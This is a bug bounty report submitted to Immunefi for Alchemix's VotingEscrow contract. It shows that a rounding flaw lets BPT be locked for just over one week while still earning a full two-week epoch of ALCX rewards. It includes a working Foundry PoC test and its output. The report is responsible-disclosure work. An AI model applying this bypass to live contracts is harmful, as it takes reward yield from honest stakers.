# 31276 - \[SC - High] BPT can be locked for only week resulting in u...

Submitted on May 16th 2024 at 03:32:46 UTC by @marchev for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31276

Report type: Smart Contract

Report severity: High

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

The 80/20 ALCX/WETH BPT has a minimum lock period of 1 epoch (2 weeks). However, a flaw allows malicious actors to lock their BPT for just 1 week, resulting in unfair ALCX reward distribution. This means a malicious actor can unfairly claim rewards without meeting the minimum 2-week lock requirement.

## Vulnerability Details

The `_createLock()` function is responsible for creating a lock when depositing Balancer Pool Tokens in `VotingEscrow`. It should enforce a minimum lock period of 1 epoch (2 weeks):

```sol
    function _createLock(
        uint256 _value,
        uint256 _lockDuration,
        bool _maxLockEnabled,
        address _to
    ) internal returns (uint256) {
	    // ...
        uint256 unlockTime = /** ... */ ((block.timestamp + _lockDuration) / WEEK) * WEEK;

        // ...
        require(unlockTime >= (((block.timestamp + EPOCH) / WEEK) * WEEK), "Voting lock must be 1 epoch");

        // ...
    }
```

However, this check is flawed. A malicious actor can lock BPTs for just 1 week instead of the required 2 weeks. This allows them to unjustly receive rewards as if they had locked their BPTs for a whole epoch, effectively stealing rewards from other participants.

**Example Scenario:**

* Next epoch starts at `1717632000` (Thu Jun 06 2024 00:00:00 UTC)

1. Alice locks 1 BPT for `2 weeks` (1 epoch) at `block.timestamp = 1716422401` (Thu May 23 2024 00:00:01 UTC)
2. Bob locks 1 BPT for `7 days + 1 seconds` at `block.timestamp = 1717027199` (Wed May 29 2024 23:59:59 UTC)
3. The epoch resets on `1717632000` (Thu Jun 06 2024 00:00:00 UTC)

**Expected behavior:** Bob should not be able to lock his BPT for less than 1 epoch (2 weeks).

**Actual behavior:** Alice and Bob receive equal rewards.

Bob circumvents the minimum lock duration check. Here’s why:

```sol
block.timestamp = 1717027199

unlockTime = ((block.timestamp + _lockDuration) / WEEK) * WEEK

unlockTime = ((1717027199 + 7 days + 1 seconds) / WEEK) * WEEK

unlockTime = 1717632000
```

The check performed:

```
unlockTime >= (((block.timestamp + EPOCH) / WEEK) * WEEK)

1717632000 >= (((1717027199 + 2 weeks) / 1 weeks) * 1 weeks)

1717632000 >= 1717632000
```

The check passes for Bob, even though his lock time is only `7 days + 1 second`.

## Impact Details

The flawed minimum lock time check allows users to lock BPTs for only 1 week but still receive rewards for a full epoch. This results in unfair reward distribution, with malicious users effectively stealing rewards from others.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1375-L1381>

## Proof of Concept

The following coded PoC demonstrates the issue.

Add the following test case to `VotingEscrow.t.sol`:

```sol
    function test_can_create_lock_for_less_than_1_epoch() public {
        console.log(newEpoch());

        address alice = address(1337);
        vm.label(alice, "Alice");
        address bob = address(31337);
        vm.label(bob, "Bob");

        // Mint Alice & Bob some BPT
        deal(bpt, alice, 10e18);
        deal(bpt, bob, 10e18);

        // Warp time to exactly 2 weeks before the new epoch
        hevm.warp(newEpoch() - 2 weeks); 

        hevm.startPrank(alice);
        IERC20(bpt).approve(address(veALCX), 1e18);
        uint256 aliceTokenId = veALCX.createLock(1e18, 2 weeks, false);
        voter.reset(aliceTokenId);
        // Alice locks 1 BPT for 2 weeks (the minimum lock period) and reset the tokenId
        hevm.stopPrank();

        // Warp time to 7 days and 2 seconds before the next epoch starts
        hevm.warp(newEpoch() - (7 days + 2 seconds));

        hevm.startPrank(bob);
        IERC20(bpt).approve(address(veALCX), 1e18);
        uint256 bobTokenId = veALCX.createLock(1e18, 7 days + 1 seconds, false);
        // Bob succeeds in locking 1 BPT for 7 days + 1 seconds which is less than the required minimum lock period of 1 epoch (2 weeks)
        voter.reset(bobTokenId);
        hevm.stopPrank();

        // Warp time to the start of the new epoch
        hevm.warp(newEpoch());

        // Distribute the rewards
        voter.distribute();

        // Print the unclaimed rewards accrued by Alice & Bob
        console.log("Unclaimed ALCX (Alice): %s", distributor.claimable(aliceTokenId));
        console.log("Unclaimed FLUX (Alice): %s", flux.getUnclaimedFlux(aliceTokenId));

        console.log("Unclaimed ALCX (Bob): %s", distributor.claimable(bobTokenId));
        console.log("Unclaimed FLUX (Bob): %s", flux.getUnclaimedFlux(bobTokenId));
    }
```

Make sure the following entries are updated in `Makefile`:

```sh
# file to test 
FILE=VotingEscrow

# specific test to run
TEST=test_can_create_lock_for_less_than_1_epoch
```

Run the PoC via:

```sh
make test_file_test
```

PoC output:

```sh
Ran 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] test_can_create_lock_for_less_than_1_epoch() (gas: 3647937)
Logs:
  Unclaimed ALCX (Alice): 1023262077024604404512
  Unclaimed FLUX (Alice): 38356132673449616
  Unclaimed ALCX (Bob): 1023262077024604404512
  Unclaimed FLUX (Bob): 19178113901412783

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 45.46s (33.49s CPU time)

Ran 1 test suite in 46.90s (45.46s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
